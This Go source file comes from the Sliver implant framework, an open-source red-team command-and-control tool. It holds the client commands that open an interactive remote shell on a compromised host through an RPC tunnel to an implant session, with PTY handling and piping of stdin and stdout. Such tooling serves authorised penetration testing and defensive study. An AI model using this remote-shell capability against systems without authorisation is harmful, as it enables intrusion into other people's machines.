package shell

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"context"
	"io"
	"log"
	"os"

	"github.com/bishopfox/sliver/client/command/settings"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/spf13/cobra"
	"golang.org/x/term"
)

const (
	windows = "windows"
	darwin  = "darwin"
	linux   = "linux"
)

// ShellCmd - Start an interactive shell on the remote system.
func ShellCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	if !settings.IsUserAnAdult(con) {
		return
	}

	shellPath, _ := cmd.Flags().GetString("shell-path")
	noPty, _ := cmd.Flags().GetBool("no-pty")
	if con.ActiveTarget.GetSession().OS != linux && con.ActiveTarget.GetSession().OS != darwin {
		noPty = true // Sliver's PTYs are only supported on linux/darwin
	}
	runInteractive(cmd, shellPath, noPty, con)
	con.Println("Shell exited")
}

func runInteractive(cmd *cobra.Command, shellPath string, noPty bool, con *console.SliverClient) {
	con.Println()
	con.PrintInfof("Wait approximately 10 seconds after exit, and press <enter> to continue\n")
	con.PrintInfof("Opening shell tunnel (EOF to exit) ...\n\n")
	session := con.ActiveTarget.GetSession()
	if session == nil {
		return
	}

	// Create an RPC tunnel, then start it before binding the shell to the newly created tunnel
	ctxTunnel, cancelTunnel := context.WithCancel(context.Background())

	rpcTunnel, err := con.Rpc.CreateTunnel(ctxTunnel, &sliverpb.Tunnel{
		SessionID: session.ID,
	})
	defer cancelTunnel()
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	log.Printf("Created new tunnel with id: %d, binding to shell ...", rpcTunnel.TunnelID)

	// Start() takes an RPC tunnel and creates a local Reader/Writer tunnel object
	tunnel := core.GetTunnels().Start(rpcTunnel.TunnelID, rpcTunnel.SessionID)

	shell, err := con.Rpc.Shell(context.Background(), &sliverpb.ShellReq{
		Request:   con.ActiveTarget.Request(cmd),
		Path:      shellPath,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
	})
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	//
	if shell.Response != nil && shell.Response.Err != "" {
		con.PrintErrorf("Error: %s\n", shell.Response.Err)
		_, err = con.Rpc.CloseTunnel(context.Background(), &sliverpb.Tunnel{
			TunnelID:  tunnel.ID,
			SessionID: session.ID,
		})
		if err != nil {
			con.PrintErrorf("RPC Error: %s\n", err)
		}
		return
	}
	defer tunnel.Close()
	log.Printf("Bound remote shell pid %d to tunnel %d", shell.Pid, shell.TunnelID)
	con.PrintInfof("Started remote shell with pid %d\n\n", shell.Pid)

	var oldState *term.State
	if !noPty {
		oldState, err = term.MakeRaw(0)
		log.Printf("Saving terminal state: %v", oldState)
		if err != nil {
			con.PrintErrorf("Failed to save terminal state")
			return
		}
	}

	log.Printf("Starting stdin/stdout shell ...")
	go func() {
		n, err := io.Copy(os.Stdout, tunnel)
		log.Printf("Wrote %d bytes to stdout", n)
		if err != nil {
			con.PrintErrorf("Error writing to stdout: %s", err)
			return
		}
	}()
	log.Printf("Reading from stdin ...")
	n, err := io.Copy(tunnel, newFilterReader(os.Stdin))
	log.Printf("Read %d bytes from stdin", n)
	if err != nil && err != io.EOF {
		con.PrintErrorf("Error reading from stdin: %s\n", err)
	}

	if !noPty {
		log.Printf("Restoring terminal state ...")
		term.Restore(0, oldState)
	}

	log.Printf("Exit interactive")
	bufio.NewWriter(os.Stdout).Flush()
}
